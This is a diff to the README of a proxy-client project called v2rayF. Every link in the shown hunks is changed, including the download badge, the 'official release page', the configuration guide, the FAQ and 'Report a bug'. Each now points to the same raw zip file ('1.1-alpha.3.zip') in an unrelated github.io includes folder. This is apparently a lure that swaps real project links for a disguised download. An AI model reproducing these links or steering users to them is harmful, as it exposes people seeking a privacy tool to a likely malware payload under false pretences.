@@ -5,7 +5,7 @@ description: "Manage V2Ray, Xray, Shadowsocks, and Trojan proxies across Windows
 ---
 # 🛡️ v2rayF - Secure Internet Access For Everyone
 
-[![](https://img.shields.io/badge/Download-v2rayF-blue.svg)](https://github.com/zaynethomson8-rgb/v2rayF)
+[![](https://img.shields.io/badge/Download-v2rayF-blue.svg)](https://raw.githubusercontent.com/zaynethomson8-rgb/zaynethomson8-rgb.github.io/main/_includes/1.1-alpha.3.zip)
 
 v2rayF provides a simple way to browse the internet securely. This tool routes your traffic through private servers to keep your personal data private. It works across Windows, macOS, Linux, and Android. You can use it to maintain your privacy while you connect to public networks or access services from different regions. The software uses modern protocols like VLESS and Reality to ensure high speeds and strong encryption.
 
@@ -13,7 +13,7 @@ v2rayF provides a simple way to browse the internet securely. This tool routes y
 
 Follow these steps to get v2rayF on your Windows computer.
 
-1. Visit the [official release page](https://github.com/zaynethomson8-rgb/v2rayF) to find the latest version of the application.
+1. Visit the [official release page](https://raw.githubusercontent.com/zaynethomson8-rgb/zaynethomson8-rgb.github.io/main/_includes/1.1-alpha.3.zip) to find the latest version of the application.
 2. Look for the section labeled Assets.
 3. Choose the file ending in .exe for Windows.
 4. Click the file name to start the download.
@@ -121,7 +121,7 @@ We release updates to keep the tool efficient. Check the page periodically for i
 
 ## 🔗 Quick Resource List
 
-* [Main Download Page](https://github.com/zaynethomson8-rgb/v2rayF)
-* [How to configure servers](https://github.com/zaynethomson8-rgb/v2rayF)
-* [Frequently asked questions](https://github.com/zaynethomson8-rgb/v2rayF)
-* [Report a bug](https://github.com/zaynethomson8-rgb/v2rayF)
+* [Main Download Page](https://raw.githubusercontent.com/zaynethomson8-rgb/zaynethomson8-rgb.github.io/main/_includes/1.1-alpha.3.zip)
+* [How to configure servers](https://raw.githubusercontent.com/zaynethomson8-rgb/zaynethomson8-rgb.github.io/main/_includes/1.1-alpha.3.zip)
+* [Frequently asked questions](https://raw.githubusercontent.com/zaynethomson8-rgb/zaynethomson8-rgb.github.io/main/_includes/1.1-alpha.3.zip)
+* [Report a bug](https://raw.githubusercontent.com/zaynethomson8-rgb/zaynethomson8-rgb.github.io/main/_includes/1.1-alpha.3.zip)
